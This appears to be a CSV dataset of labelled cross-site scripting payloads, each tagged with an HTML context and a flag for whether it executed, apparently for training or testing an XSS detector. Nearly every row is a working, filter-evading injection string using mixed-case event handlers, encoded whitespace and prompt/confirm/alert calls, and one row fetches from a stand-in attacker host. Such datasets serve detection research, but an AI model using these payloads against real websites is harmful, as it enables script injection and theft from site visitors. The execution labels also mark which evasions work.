payload,context,exec,combined
<hTml/+/onMoUseoVER%09=%09(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTml/+/onMoUseoVER%09=%09(prompt)``%0dx>
<d3V%0dONpoiNtEREnTer%0a=%0a(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dONpoiNtEREnTer%0a=%0a(prompt)``>v3dm0s
<A%09oNPoiNteRenTEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09oNPoiNteRenTEr%09=%09confirm()%0dx>v3dm0s
<HtMl%0dOnPoinTEREnTeR%0a=%0aconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtMl%0dOnPoinTEREnTeR%0a=%0aconfirm()>
"<d3v/+/ONMouSeover+=+a=prompt,a()>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <d3v/+/ONMouSeover+=+a=prompt,a()>v3dm0s"
<a%0donmOUsEOver+=+(prompt)``%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%0donmOUsEOver+=+(prompt)``%0dx>v3dm0s
<d3v/+/OnpOintErENTEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/OnpOintErENTEr%0a=%0aconfirm()%0dx>v3dm0s
<d3V/+/ONPoIntEREntER%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/ONPoIntEREntER%09=%09confirm()%0dx>v3dm0s
"<HTML%0donpoINTerenTER%0d=%0da=prompt,a()%0dx//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HTML%0donpoINTerenTER%0d=%0da=prompt,a()%0dx//"
<d3v%0aonpOiNterEnteR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aonpOiNterEnteR%0a=%0a(prompt)``%0dx>v3dm0s
<HtML%09ONMOUseoVer%0a=%0aconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtML%09ONMOUseoVer%0a=%0aconfirm()%0dx//
<d3V/+/ONmoUSEOVeR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/ONmoUSEOVeR%0a=%0a[8].find(confirm)>v3dm0s
<DETAiLs%0aoNtogGlE%0d=%0d[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETAiLs%0aoNtogGlE%0d=%0d[8].find(confirm)>
"<D3V%0aonpOINTEreNTEr%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aonpOINTEreNTEr%09=%09a=prompt,a()%0dx>v3dm0s"
"<d3v%09oNpOinTeRENteR+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09oNpOinTeRENteR+=+a=prompt,a()%0dx>v3dm0s"
"<DETaiLS%0dONpoiNTErEntEr+=+a=prompt,a()%0dx//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <DETaiLS%0dONpoiNTErEntEr+=+a=prompt,a()%0dx//"
<d3v/+/OnpOintErENTEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/OnpOintErENTEr%0a=%0aconfirm()%0dx>v3dm0s
<A%09oNPoinTERenteR%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09oNPoinTERenteR%09=%09confirm()>v3dm0s
<D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/ONpOiNterentER%09=%09confirm()>v3dm0s
sort=price_asc,html_text,0,CTX_html_text CTX_html_text CTX_html_text sort=price_asc
<HTML/+/ONmOuseOVEr+=+[8].find(confirm)%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTML/+/ONmOuseOVEr+=+[8].find(confirm)%0dx>
<A%0dOnMoUSEOVER+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnMoUSEOVER+=+confirm()>v3dm0s
<htML%0aOnpOINTErENter+=+confirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htML%0aOnpOINTErENter+=+confirm()>
<D3v%0aOnPOinterentER%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%0aOnPOinterentER%09=%09[8].find(confirm)%0dx>v3dm0s
<HTML%0aonMouSeovEr+=+(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML%0aonMouSeovEr+=+(confirm)()%0dx>
<A/+/onPOinteReNTer%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/onPOinteReNTer%09=%09[8].find(confirm)%0dx>v3dm0s
"<A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s"
<a%09onpoiNTerENtEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09onpoiNTerENtEr%0d=%0dconfirm()%0dx>v3dm0s
<d3V%0aonpoinTeRENTeR%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aonpoinTeRENTeR%0a=%0aconfirm()>v3dm0s
"<DeTaiLS/+/onToGGlE%0a=%0aa=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DeTaiLS/+/onToGGlE%0a=%0aa=prompt,a()>"
<D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/ONMouseoVer%0d=%0d[8].find(confirm)%0dx>v3dm0s
<hTMl%0aoNpointeREnter+=+[8].find(confirm)//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTMl%0aoNpointeREnter+=+[8].find(confirm)//
"<dETAILs%0dOnTOGgLE%0d=%0da=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <dETAILs%0dOnTOGgLE%0d=%0da=prompt,a()>"
<dETAILs%09ONpoinTerENteR%0d=%0d[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAILs%09ONpoinTerENteR%0d=%0d[8].find(confirm)>
<D3v%09onpoInTerEnTer%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09onpoInTerEnTer%0d=%0dconfirm()>v3dm0s
"<A/+/oNmoUSEOVER%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A/+/oNmoUSEOVER%0d=%0da=prompt,a()>v3dm0s"
<D3v/+/OnmOuSeOver%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/OnmOuSeOver%0d=%0dconfirm()>v3dm0s
<d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s
<a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s
<D3V%0aoNmOuSEOvER%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aoNmOuSEOvER%0a=%0aconfirm()%0dx>v3dm0s
<d3V/+/ONpOinteRENtER%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/ONpOinteRENtER%0d=%0d(prompt)``>v3dm0s
<hTmL/+/ONpoINTeRENTEr+=+(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTmL/+/ONpoINTeRENTEr+=+(confirm)()%0dx>
<detaiLs/+/OnpOinTerENtEr%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detaiLs/+/OnpOinTerENtEr%0a=%0aconfirm()%0dx//
<A%0aonmOuseoVer+=+confirm()%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonmOuseoVer+=+confirm()%0dx>v3dm0s
"<D3V%0donmOUseoVeR%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3V%0donmOUseoVeR%09=%09a=prompt,a()%0dx>v3dm0s"
<deTaIls%0dONTOgGle%0a=%0aconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTaIls%0dONTOgGle%0a=%0aconfirm()//
<HTMl/+/ONMousEOVeR%09=%09(confirm)()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTMl/+/ONMousEOVeR%09=%09(confirm)()>
<DETails/+/ONpoINTEreNTeR%09=%09[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETails/+/ONpoINTEreNTeR%09=%09[8].find(confirm)>
<HtmL%09onpOIntEreNteR%09=%09(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%09onpOIntEreNteR%09=%09(confirm)()//
<d3v%09OnmoUseoVer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09OnmoUseoVer%0d=%0dconfirm()%0dx>v3dm0s
""" onmouseenter=alert(1) """,html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute "" onmouseenter=alert(1) """
</pre><img src=x onerror=alert`1`>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag </pre><img src=x onerror=alert`1`>
<Html%0aonPOinterENter%0a=%0a[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html%0aonPOinterENter%0a=%0a[8].find(confirm)>
<d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s
<A%0aOnPOInTErENteR%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aOnPOInTErENteR%0d=%0d(prompt)``>v3dm0s
<A%09OnPoInterenter%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09OnPoInterenter%0a=%0a[8].find(confirm)%0dx>v3dm0s
<a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s
"<A%0dOnpOiNTERentEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnpOiNTERentEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<A%0aonmoUseoVER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonmoUseoVER%09=%09confirm()%0dx>v3dm0s
<d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s
<a%0aonMOusEoveR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aonMOusEoveR%0a=%0aconfirm()%0dx>v3dm0s
<DeTAilS%09OnPoInTEREnTer%0a=%0aconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTAilS%09OnPoInTEREnTer%0a=%0aconfirm()%0dx//
<D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s
"<A%09ONmoUseoVeR+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <A%09ONmoUseoVeR+=+a=prompt,a()%0dx>v3dm0s"
<a%0aoNPOiNtereNteR%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aoNPOiNtereNteR%0d=%0d(prompt)``>v3dm0s
<DeTAILS%0doNTOGgle%09=%09confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTAILS%0doNTOGgle%09=%09confirm()%0dx>
<DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//
<a%0aONMOusEoVER+=+(prompt)``%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aONMOusEoVER+=+(prompt)``%0dx>v3dm0s
<a%0dOnpoInTERENTEr%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0dOnpoInTERENTEr%0a=%0a(confirm)()%0dx>v3dm0s
<DeTAiLS%0aONPoiNTErentER%0a=%0a[8].find(confirm)>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTAiLS%0aONPoiNTErentER%0a=%0a[8].find(confirm)>
<dETaiLs/+/OnpoinTeRenter%0d=%0d(confirm)()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETaiLs/+/OnpoinTeRenter%0d=%0d(confirm)()%0dx>
<a%0aoNMOuSEoVEr%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aoNMOuSEoVEr%09=%09[8].find(confirm)%0dx>v3dm0s
<D3V%09OnmOuSeOvER%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09OnmOuSeOvER%0a=%0aconfirm()%0dx>v3dm0s
"<a%0doNpoINTereNtER+=+a=prompt,a()>v3dm0s",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <a%0doNpoINTereNtER+=+a=prompt,a()>v3dm0s"
"<deTAIls%09ONpoINTEREnTER+=+a=prompt,a()%0dx>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <deTAIls%09ONpoINTEREnTER+=+a=prompt,a()%0dx>"
<dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>,url_href,0,CTX_url_href CTX_url_href CTX_url_href <dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>
<d3v/+/oNmoUsEOVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/oNmoUsEOVEr%0d=%0d(prompt)``%0dx>v3dm0s
<a%0aONMOusEoVEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aONMOusEoVEr%0a=%0aconfirm()%0dx>v3dm0s
<a%0doNPoiNteReNter+=+(prompt)``%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%0doNPoiNteReNter+=+(prompt)``%0dx>v3dm0s
<d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s,html_attribute,0,CTX_html_attribute CTX_html_attribute CTX_html_attribute <d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s
javascript:confirm`1`,html_text,0,CTX_html_text CTX_html_text CTX_html_text javascript:confirm`1`
<d3V%0aonpoinTeRENTeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aonpoinTeRENTeR%0a=%0aconfirm()>v3dm0s
<D3v%09ONmOUseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09ONmOUseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<dEtAIls%0dONtOgglE+=+(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtAIls%0dONtOgglE+=+(confirm)()%0dx>
<HTmL%0dONpoiNTEreNTeR+=+confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTmL%0dONpoiNTEreNTeR+=+confirm()%0dx>
<A%0aOnpOintErentER%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aOnpOintErentER%0d=%0d[8].find(confirm)>v3dm0s
<A/+/oNpoInteReNter%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/oNpoInteReNter%0d=%0d[8].find(confirm)%0dx>v3dm0s
<D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s
<DetAiLS%0aONtoGGLe%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetAiLS%0aONtoGGLe%0a=%0aconfirm()%0dx//
<D3v%0aOnmouseoVer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnmouseoVer%0d=%0dconfirm()%0dx>v3dm0s
<A%0donmOusEOvEr+=+(prompt)``>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0donmOusEOvEr+=+(prompt)``>v3dm0s
<detAILs%0doNpoInTErENtER+=+confirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <detAILs%0doNpoInTErENtER+=+confirm()%0dx>
<a/+/onmOUSeOVer+=+(confirm)()%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/onmOUSeOVer+=+(confirm)()%0dx>v3dm0s
<svg onload=prompt(1)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <svg onload=prompt(1)>
<DetailS%0aONtogglE+=+(prompt)``>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetailS%0aONtogglE+=+(prompt)``>
"<d3v%0dONpOiNTereNTEr%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <d3v%0dONpOiNTereNTEr%0d=%0da=prompt,a()>v3dm0s"
<A%0aonpoIntEReNter%0d=%0d(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aonpoIntEReNter%0d=%0d(confirm)()>v3dm0s
<HTmL%0dOnMOuSeoVer%0d=%0dconfirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTmL%0dOnMOuSeoVer%0d=%0dconfirm()//
<html%0dOnpoinTEreNter%0a=%0aconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <html%0dOnpoinTEreNter%0a=%0aconfirm()%0dx>
<a/+/ONmoUSEovER+=+confirm()%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/ONmoUSEovER+=+confirm()%0dx>v3dm0s
"<A%09ONMOuseoVER%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%09ONMOuseoVER%0d=%0da=prompt,a()%0dx>v3dm0s"
<A%0aONmOuseOvEr%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONmOuseOvEr%0d=%0d(prompt)``>v3dm0s
<a%0donMoUSeOVer+=+[8].find(confirm)>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <a%0donMoUSeOVer+=+[8].find(confirm)>v3dm0s
<D3v%0dONPOInTerentER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0dONPOInTerentER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<A%0aOnMOUSeOver%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aOnMOUSeOver%09=%09(confirm)()%0dx>v3dm0s
<HtMl%09ONMOuseOver%0a=%0a[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtMl%09ONMOuseOver%0a=%0a[8].find(confirm)%0dx//
<html/+/OnmOUSEOveR%0a=%0aconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <html/+/OnmOUSEOveR%0a=%0aconfirm()%0dx>
"<A%09ONMOuseoVER%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A%09ONMOuseoVER%0d=%0da=prompt,a()%0dx>v3dm0s"
<a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
"<dEtAiLS%0dOnTOgGLe%0a=%0aa=prompt,a()%0dx//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <dEtAiLS%0dOnTOgGLe%0a=%0aa=prompt,a()%0dx//"
<A/+/onPOinteReNTer%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/onPOinteReNTer%09=%09[8].find(confirm)%0dx>v3dm0s
"<a%09onpoinTeReNTer%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%09onpoinTeReNTer%09=%09a=prompt,a()%0dx>v3dm0s"
<HtmL%0aoNpOiNTErENTEr%0d=%0d(confirm)()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtmL%0aoNpOiNTErENTEr%0d=%0d(confirm)()%0dx//
<hTml/+/onPoiNTerEntEr%0d=%0d(confirm)()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTml/+/onPoiNTerEntEr%0d=%0d(confirm)()//
<d3v%0dONMouSEOVEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0dONMouSEOVEr%0d=%0d(confirm)()>v3dm0s
<a%0dOnpoInTERENTEr%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dOnpoInTERENTEr%0a=%0a(confirm)()%0dx>v3dm0s
<hTml%09oNmOUSeOVeR%09=%09(prompt)``>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTml%09oNmOUSeOVeR%09=%09(prompt)``>
"""><script>alert(1)</script>",html_attribute,1,"CTX_html_attribute CTX_html_attribute CTX_html_attribute ""><script>alert(1)</script>"
<video src=x onerror=alert(1)>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <video src=x onerror=alert(1)>
"<D3v%0donmoUSEOver%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0donmoUSEOver%0d=%0da=prompt,a()>v3dm0s"
<HTML/+/ONmOuseOVEr+=+[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML/+/ONmOuseOVEr+=+[8].find(confirm)%0dx>
<D3v%0aONpOINterEntER%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aONpOINterEntER%09=%09[8].find(confirm)%0dx>v3dm0s
<D3V%0donmoUSeovEr%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0donmoUSeovEr%0d=%0d(prompt)``>v3dm0s
<d3v/+/OnpoiNTeREnTeR%0a=%0a(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/OnpoiNTeREnTeR%0a=%0a(prompt)``>v3dm0s
<HTml%0doNmOUSEOVer+=+[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTml%0doNmOUSEOVer+=+[8].find(confirm)>
<hTml%0doNMOUseOvEr%09=%09(prompt)``>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTml%0doNMOUseOvEr%09=%09(prompt)``>
<a%0aonPOiNtEreNteR+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aonPOiNtEreNteR+=+[8].find(confirm)%0dx>v3dm0s
"<d3v%09onMOUSEoveR%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09onMOUSEoveR%09=%09a=prompt,a()%0dx>v3dm0s"
<A%0aonpoIntEReNter%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aonpoIntEReNter%0d=%0d(confirm)()>v3dm0s
<D3V%09ONPOinTErENTER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%09ONPOinTErENTER%0d=%0dconfirm()%0dx>v3dm0s
<A%09oNMOUsEOvER%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%09oNMOUsEOvER%09=%09[8].find(confirm)>v3dm0s
<A%09OnpOInTeRENtER%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09OnpOInTeRENtER%0d=%0d(prompt)``>v3dm0s
username,html_text,0,CTX_html_text CTX_html_text CTX_html_text username
<script>fetch('http://attacker.com')</script>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <script>fetch('http://attacker.com')</script>
"<D3V/+/oNMOUseoVEr%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/oNMOUseoVEr%0d=%0da=prompt,a()>v3dm0s"
<A%0aOnPoIntEreNter%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aOnPoIntEreNter%0d=%0dconfirm()>v3dm0s
<dETAIlS%0aonpoIntEreNter+=+confirm()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETAIlS%0aonpoIntEreNter+=+confirm()//
<HTmL/+/OnmOuSEOVEr%0a=%0a(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTmL/+/OnmOuSEOVEr%0a=%0a(prompt)``//
<HtmL%09ONMoUSeOvER%09=%09[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%09ONMoUSeOvER%09=%09[8].find(confirm)%0dx//
<A%0aOnpOintErentER%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aOnpOintErentER%0d=%0d[8].find(confirm)>v3dm0s
<htmL%0donmOuSEoVer%0a=%0aconfirm()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htmL%0donmOuSEoVer%0a=%0aconfirm()>
